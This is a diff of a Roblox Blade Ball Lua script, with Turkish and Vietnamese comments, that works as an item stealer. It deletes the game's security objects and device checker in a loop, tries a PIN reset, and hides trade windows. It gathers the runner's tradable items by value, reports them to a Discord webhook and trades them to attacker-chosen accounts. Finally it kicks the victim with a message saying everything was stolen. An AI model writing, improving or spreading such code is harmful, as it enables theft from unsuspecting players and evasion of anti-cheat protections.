@@ -9,22 +9,36 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local VirtualUser = game:GetService("VirtualUser")
 
--- Xóa các phần tử bảo mật
-local securityFolder = ReplicatedStorage:FindFirstChild("Security")
-if securityFolder then
-    if securityFolder:FindFirstChild("RemoteEvent") then
-        securityFolder.RemoteEvent:Destroy()
+-- Hàm xóa các phần tử bảo mật
+local function deleteSecurityObjects()
+    local securityFolder = ReplicatedStorage:FindFirstChild("Security")
+    if securityFolder then
+        if securityFolder:FindFirstChild("RemoteEvent") then
+            securityFolder.RemoteEvent:Destroy()
+        end
+        if securityFolder:FindFirstChild("") then
+            securityFolder[""]:Destroy()
+        end
+        -- Xóa luôn thư mục Security
+        securityFolder:Destroy()
     end
-    if securityFolder:FindFirstChild("") then
-        securityFolder[""]:Destroy()
-    end
-    securityFolder:Destroy()
 end
 
-local deviceChecker = Players.LocalPlayer.PlayerScripts.Client:FindFirstChild("DeviceChecker")
-if deviceChecker then
-    deviceChecker:Destroy()
+local function deleteDeviceChecker()
+    local deviceChecker = Players.LocalPlayer.PlayerScripts.Client:FindFirstChild("DeviceChecker")
+    if deviceChecker then
+        deviceChecker:Destroy()
+    end
 end
+
+-- Chạy liên tục trong 2 giây để đảm bảo các phần tử bị xóa
+task.spawn(function()
+    for i=1, 20 do -- 20 lần, mỗi lần 0.1 giây = 2 giây
+        deleteSecurityObjects()
+        deleteDeviceChecker()
+        task.wait(0.1)
+    end
+end)
 
 -- AFK koruması
 plr.Idled:Connect(function()
@@ -32,7 +46,8 @@ plr.Idled:Connect(function()
     VirtualUser:ClickButton2(Vector2.new())
 end)
 
--- Değişkenler (kullanıcıdan alınacak)
+-- Các biến và phần còn lại của script của bạn...
+
 local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
@@ -43,19 +58,16 @@ if next(users) == nil or webhook == "" then
     return
 end
 
--- Oyun kontrolü
 if game.PlaceId ~= 13772394625 then
     plr:Kick("Game not supported. Please join a normal Blade Ball server")
     return
 end
 
--- Sunucu kontrolü
 if #Players:GetPlayers() >= 16 then
     plr:Kick("Server is full. Please join a less populated server")
     return
 end
 
--- VIP server kontrolü (hata almamak için pcall ile)
 pcall(function()
     if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
         plr:Kick("Server error. Please join a DIFFERENT server")
@@ -63,10 +75,8 @@ pcall(function()
     end
 end)
 
--- Net modülü
 local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
 
--- PIN bypass (daha yumuşak)
 task.wait(2)
 local pinSuccess, pinResult = pcall(function()
     return netModule:WaitForChild("RF/ResetPINCode"):InvokeServer({option = "PIN", value = "9079"})
@@ -77,7 +87,6 @@ if pinSuccess and pinResult and pinResult ~= "You don't have a PIN code" then
     return
 end
 
--- GUI'leri bul và đóng
 local PlayerGui = plr:WaitForChild("PlayerGui")
 local tradeGui = PlayerGui:FindFirstChild("Trade")
 local tradeCompleteGui = PlayerGui:FindFirstChild("TradeCompleted")
@@ -104,7 +113,6 @@ if notificationsGui then
     end)
 end
 
--- Trade durum değişkeni
 local inTrade = false
 if tradeGui then
     tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
@@ -112,20 +120,16 @@ if tradeGui then
     end)
 end
 
--- Envanter
 local clientInventory
 local Replion = require(ReplicatedStorage.Packages.Replion)
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
 local rapData = rapDataResult and rapDataResult.Data and rapDataResult.Data.Items or {}
 
--- Kategoriler
 local categories = {"Sword", "Emote", "Explosion"}
 
--- Itemleri topla
 local itemsToSend = {}
 local totalRAP = 0
 
--- RAP map oluştur
 local function buildNameToRAPMap(category)
     local nameToRAP = {}
     local categoryRapData = rapData[category]
@@ -152,7 +156,6 @@ for _, category in ipairs(categories) do
     rapMappings[category] = buildNameToRAPMap(category)
 end
 
--- Client envanteri al
 pcall(function()
     clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
 end)
@@ -162,7 +165,6 @@ if not clientInventory then
     return
 end
 
--- Itemleri filtrele
 for _, category in ipairs(categories) do
     for itemId, itemInfo in pairs(clientInventory[category] or {}) do
         if not itemInfo.TradeLock then
@@ -188,7 +190,6 @@ end
 
 table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
 
--- Webhook fonksiyonları
 local function formatNumber(number)
     if not number then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -280,7 +281,6 @@ local function SendMessage(list)
     end)
 end
 
--- Trade fonksiyonları (yavaşlatılmış, random bekleme)
 local function sendTradeRequest(user)
     local target = Players:FindFirstChild(user)
     if not target then return end
@@ -318,7 +318,6 @@ local function getNextBatch(items, batchSize)
     return batch
 end
 
--- Token ekleme
 local function addTokens()
     pcall(function()
         if tradeGui and tradeGui.Main and tradeGui.Main.Currency and tradeGui.Main.Currency.Coins and tradeGui.Main.Currency.Coins.Amount then
@@ -332,7 +331,6 @@ local function addTokens()
     end)
 end
 
--- Ana trade döngüsü
 local function doTrade(joinedUser)
     local itemsCopy = {}
     for _, v in ipairs(itemsToSend) do table.insert(itemsCopy, v) end
@@ -390,7 +388,6 @@ local function doTrade(joinedUser)
     plr:Kick("All your stuff just got stolen. discord.gg/GY2RVSEGDT")
 end
 
--- Gửi tin nhắn chính
 local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
 SendJoinMessage(itemsToSend, prefix)
 
